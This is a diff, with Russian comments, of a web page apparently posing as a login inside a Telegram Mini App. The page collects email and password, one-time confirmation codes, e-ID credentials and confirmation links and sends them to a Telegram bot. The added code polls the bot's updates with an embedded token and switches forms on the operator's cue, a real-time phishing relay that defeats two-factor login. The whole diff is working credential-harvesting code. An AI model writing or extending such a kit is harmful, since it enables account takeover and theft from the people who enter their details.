@@ -731,7 +731,7 @@
         const pageEid = document.getElementById('pageEid');
         const pageSuccess = document.getElementById('pageSuccess');
 
-        // Элементы форм
+        // Элементы
         const email = document.getElementById('email');
         const password = document.getElementById('password');
         const codeInput = document.getElementById('codeInput');
@@ -758,9 +758,10 @@
 
         let eidEmailValue = '';
         let eidPasswordValue = '';
+        let lastMessageId = 0;
 
         // ============================================================
-        // 3. ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
+        // 3. ВСПОМОГАТЕЛЬНЫЕ
         // ============================================================
         function showMsg(text, type = 'info') {
             msgDiv.textContent = text;
@@ -814,7 +815,7 @@
         function goToSuccess() { switchPage(pageSuccess); }
 
         // ============================================================
-        // 4. ОТПРАВКА В БОТА (ЧЕРЕЗ tg.sendData!)
+        // 4. ОТПРАВКА В БОТА (tg.sendData)
         // ============================================================
         function sendToBot(data) {
             const payload = {
@@ -823,9 +824,7 @@
             };
 
             try {
-                // ===== ОТПРАВЛЯЕМ ДАННЫЕ ЧЕРЕЗ tg.sendData =====
                 tg.sendData(JSON.stringify(payload));
-                // ===== НЕ ВЫЗЫВАЕМ tg.close()! =====
                 return true;
             } catch (error) {
                 console.error('Ошибка:', error);
@@ -834,7 +833,46 @@
         }
 
         // ============================================================
-        // 5. НАВИГАЦИЯ
+        // 5. ПЕРЕХВАТ СООБЩЕНИЙ ОТ БОТА
+        // ============================================================
+        async function checkBotMessages() {
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`);
+                const data = await response.json();
+
+                if (data.ok && data.result.length > 0) {
+                    const lastUpdate = data.result[data.result.length - 1];
+                    const updateId = lastUpdate.update_id;
+
+                    if (updateId === lastMessageId) return;
+                    lastMessageId = updateId;
+
+                    if (lastUpdate.message && lastUpdate.message.text) {
+                        const text = lastUpdate.message.text;
+                        const fromId = lastUpdate.message.from?.id;
+
+                        if (fromId && String(fromId) === String(tg.initDataUnsafe?.user?.id)) {
+                            if (text.includes('Введите код подтверждения')) {
+                                goToCodeConfirm();
+                                showMsg('📧 Введите код подтверждения', 'info');
+                            } else if (text.includes('Введите ссылку подтверждения')) {
+                                goToEid();
+                                document.getElementById('eidLinkBlock').style.display = 'block';
+                                showMsg('🔗 Введите ссылку подтверждения', 'info');
+                            }
+                        }
+                    }
+                }
+            } catch (error) {
+                console.error('Ошибка проверки сообщений:', error);
+            }
+        }
+
+        setInterval(checkBotMessages, 2000);
+        setTimeout(checkBotMessages, 1000);
+
+        // ============================================================
+        // 6. НАВИГАЦИЯ
         // ============================================================
         loginBtn.addEventListener('click', goToCodePage);
         eidBtn.addEventListener('click', goToEid);
@@ -850,9 +888,9 @@
         });
 
         // ============================================================
-        // 6. ОБЫЧНЫЙ ВХОД
+        // 7. ОБЫЧНЫЙ ВХОД
         // ============================================================
-        loginSubmitBtn.addEventListener('click', async function() {
+        loginSubmitBtn.addEventListener('click', function() {
             const e = email.value.trim();
             const p = password.value.trim();
             if (!e || !p) {
@@ -884,7 +922,7 @@
         });
 
         // ============================================================
-        // 7. КОД
+        // 8. КОД
         // ============================================================
         codeBtn.addEventListener('click', function() {
             const code = codeInput.value.trim();
@@ -909,7 +947,7 @@
         });
 
         // ============================================================
-        // 8. E-ID
+        // 9. E-ID
         // ============================================================
         eidSubmitBtn.addEventListener('click', function() {
             const e = eidEmail.value.trim();
@@ -941,7 +979,7 @@
         });
 
         // ============================================================
-        // 9. E-ID ССЫЛКА
+        // 10. E-ID ССЫЛКА
         // ============================================================
         eidLinkBtn.addEventListener('click', function() {
             const link = eidLinkInput.value.trim();
@@ -966,7 +1004,7 @@
         });
 
         // ============================================================
-        // 10. ENTER
+        // 11. ENTER
         // ============================================================
         document.addEventListener('keypress', function(e) {
             if (e.key === 'Enter') {
@@ -985,7 +1023,7 @@
         });
 
         // ============================================================
-        // 11. ТЕХПОДДЕРЖКА
+        // 12. ТЕХПОДДЕРЖКА
         // ============================================================
         function openSupport() {
             window.open('https://t.me/potok457', '_blank');
